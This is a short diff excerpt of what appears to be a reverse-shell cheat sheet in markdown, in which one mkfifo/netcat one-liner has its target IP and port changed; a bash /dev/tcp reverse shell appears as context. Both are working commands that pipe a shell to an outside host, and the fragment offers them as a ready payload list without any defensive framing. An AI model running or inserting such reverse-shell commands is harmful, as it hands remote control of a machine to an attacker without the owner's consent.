@@ -10,7 +10,7 @@ bash -c /bin/bash -i >& /dev/tcp/10.10.200.85/9001 0>&1
 ```
 ## rm:
 ```sh
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.48.128 1777 >/tmp/f
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.110.172 1337 >/tmp/f
 ```
 ## nc:
 ```sh
